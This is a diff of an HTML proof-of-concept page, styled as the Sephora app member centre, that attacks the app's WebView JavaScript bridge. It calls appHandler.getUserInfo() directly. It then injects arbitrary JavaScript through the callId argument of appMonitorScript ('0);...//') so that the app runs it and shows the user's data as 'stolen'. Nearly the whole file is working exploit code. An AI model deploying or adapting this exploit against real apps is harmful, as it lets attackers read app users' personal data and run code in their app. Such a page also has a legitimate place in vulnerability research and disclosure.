@@ -4,41 +4,69 @@
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>丝芙兰会员中心</title>
 <style>
-body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#111;color:#fff;min-height:100vh;padding:20px}
-h2{color:#c9a96e;font-size:20px}
-#log{white-space:pre-wrap;font-family:monospace;font-size:12px;background:#000;padding:12px;border-radius:8px;margin-top:16px;color:#0f0}
+*{box-sizing:border-box}
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#0d0d0d;color:#fff;min-height:100vh;padding:20px}
+h2{color:#c9a96e;font-size:20px;margin:0 0 16px}
+.box{background:#1a1a1a;border:1px solid rgba(201,169,110,.3);border-radius:12px;padding:14px;margin:10px 0}
+.box h3{font-size:14px;color:#c9a96e;margin:0 0 6px}
+.val{font-family:monospace;font-size:15px;color:#ff6b6b;padding:10px;background:#000;border-radius:8px;word-break:break-all}
+.red{background:#cc0000;color:#fff;padding:15px;border-radius:12px;margin:16px 0;font-family:monospace;font-size:14px;word-break:break-all;border:2px solid #ff0;display:none}
 </style>
 </head>
 <body>
-<h2>💎 JSBridge 数据窃取演示</h2>
-<div id="log"></div>
+<h2>💎 JSBridge 数据窃取 PoC</h2>
+
+<div class="box">
+<h3>1. appHandler 桥检测</h3>
+<div class="val" id="r0">检测中…</div>
+</div>
+
+<div class="box">
+<h3>2. getUserInfo() — 直接调用</h3>
+<div class="val" id="r1">调用中…</div>
+</div>
+
+<div class="box">
+<h3>3. callId 注入 — 通过 getExpFlag 回调执行</h3>
+<div class="val" id="r2">执行中…</div>
+</div>
+
+<div class="red" id="stolen">
+<b style="font-size:16px">🚨 callId 注入成功! 已在 WebView 中执行任意 JavaScript</b><br><br>
+<div id="stolen_data"></div>
+</div>
+
 <script>
-var L=document.getElementById('log');
-function log(s){L.textContent+=s+'\n'}
-log('bridge: '+(typeof appHandler!=='undefined'?'YES':'NO'));
+var r0=document.getElementById('r0'),r1=document.getElementById('r1'),r2=document.getElementById('r2');
 
-if(typeof appHandler!=='undefined'){
-  log('origin: '+location.origin);
-  log('★ 开始窃取...');
+if(typeof appHandler==='undefined'){
+  r0.textContent='❌ 不在丝芙兰 APP 内';
+  r1.textContent='-';r2.textContent='-';
+}else{
+  r0.textContent='✅ appHandler 存在';r0.style.color='#00c853';
 
-  // 1. getUserInfo (直接调用)
-  var user = appHandler.getUserInfo();
-  log('getUserInfo(): '+user);
+  // 直接调 getUserInfo
+  try{
+    var u=appHandler.getUserInfo();
+    r1.textContent='✅ 返回: "'+u+'"';r1.style.color='#00c853';
+  }catch(e){r1.textContent='❌ '+e}
 
-  // 2. callId 注入 — 在回调中执行任意代码
-  // 回调时从 appHandler 再拿更多数据
-  var inject = "0);" +
-    // 读 getUserInfo
-    "var u=appHandler.getUserInfo();" +
-    // 显示结果
-    "var d=document.createElement('div');" +
-    "d.style.cssText='background:#cc0000;color:#fff;padding:15px;margin:10px;font-family:monospace;font-size:14px;border-radius:8px';" +
-    "d.innerHTML='<b>🚨 通过callId注入窃取的数据:</b><br>getUserInfo: '+u;" +
-    "document.body.appendChild(d);" +
-    "//";
+  // callId 注入: 回调时在页面上写入数据(不跳转、不弹窗)
+  try{
+    var payload="0);"+
+      "var u2=appHandler.getUserInfo();"+
+      "var el=document.getElementById('stolen_data');"+
+      "el.innerHTML='getUserInfo: <b>'+u2+'</b><br>origin: <b>'+location.origin+'</b><br>时间: <b>'+new Date().toLocaleTimeString()+'</b>';"+
+      "document.getElementById('stolen').style.display='block';"+
+      "document.getElementById('r2').textContent='✅ 回调触发,JS已执行';"+
+      "document.getElementById('r2').style.color='#00c853';"+
+      "//";
+    appHandler.appMonitorScript('getExpFlag',payload,'{"expKey":"poc"}');
+  }catch(e){r2.textContent='❌ '+e}
 
-  appHandler.appMonitorScript('getExpFlag', inject, '{"expKey":"test"}');
-  log('★ callId注入已执行');
+  setTimeout(function(){
+    if(r2.textContent.indexOf('✅')<0){r2.textContent='⏳ 回调未触发(可能被拦截)';}
+  },3000);
 }
 </script>
 </body>
